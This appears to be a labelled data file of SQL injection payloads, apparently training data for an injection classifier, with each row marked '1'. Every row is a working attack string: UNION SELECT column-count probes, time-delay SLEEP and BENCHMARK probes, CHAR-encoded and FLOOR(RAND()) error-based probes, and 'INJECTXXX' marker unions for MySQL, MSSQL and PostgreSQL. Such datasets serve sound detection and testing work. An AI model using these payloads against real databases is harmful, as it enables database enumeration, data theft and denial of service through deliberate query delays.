"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",1
"UNION SELECT @@VERSION,SLEEP(5),""'3",1
"UNION SELECT @@VERSION,SLEEP(5),""'3'""#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),4#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",1
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",1
UNION ALL SELECT USER()--,1
UNION ALL SELECT SLEEP(5)--,1
"UNION ALL SELECT USER(),SLEEP(5)--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",1
UNION ALL SELECT NULL--,1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))--",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--",1
UNION ALL SELECT NULL#,1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#",1
UNION ALL SELECT NULL,1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))",1
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",1
"AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))",1
AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC),1
"AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",1
"UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--",1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",1
UNION ALL SELECT 'INJ'||'ECT'||'XXX'--,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--",1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--",1
